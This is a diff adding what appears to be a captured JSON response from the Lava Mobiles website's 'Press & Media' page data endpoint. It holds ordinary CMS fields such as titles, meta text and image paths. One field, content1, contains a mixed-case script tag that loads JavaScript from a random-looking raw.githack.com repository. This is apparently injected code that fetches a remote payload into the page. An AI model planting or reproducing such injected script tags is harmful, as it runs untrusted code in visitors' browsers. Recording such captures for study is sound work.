@@ -1,0 +1,38 @@
+{
+  "url": "https://www.lavamobiles.com/_next/data/ly0JhjssYFJ7DcRKPylzU/press-and-media.json",
+  "method": "GET",
+  "status": 200,
+  "content_type": "application/json",
+  "body": {
+    "pageProps": {
+      "PressMedia": {
+        "status": 1,
+        "msg": "press-and-media Page Content",
+        "data": {
+          "id": 12,
+          "slug": "press-and-media",
+          "name": "Press & Media",
+          "sub_text": null,
+          "content1": "<sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
+          "content2": "<p><br></p>",
+          "content3": null,
+          "content4": null,
+          "content5": null,
+          "content6": null,
+          "page_title": "Press and Media, News, Press Release Updates - Lava Mobiles",
+          "meta_keywords": null,
+          "meta_description": "Press and Media, News, Press Release Updates - Lava Mobiles",
+          "meta_other": null,
+          "video_url": null,
+          "image": "media/cmspage/image/press-banner-1702554941.webp",
+          "image_alt": null,
+          "image_mobile": "media/cmspage/image_mobile/frame-157508-(1)-1703591729.webp",
+          "status": 1
+        },
+        "leadership": {},
+        "success": "success"
+      }
+    },
+    "__N_SSG": true
+  }
+}
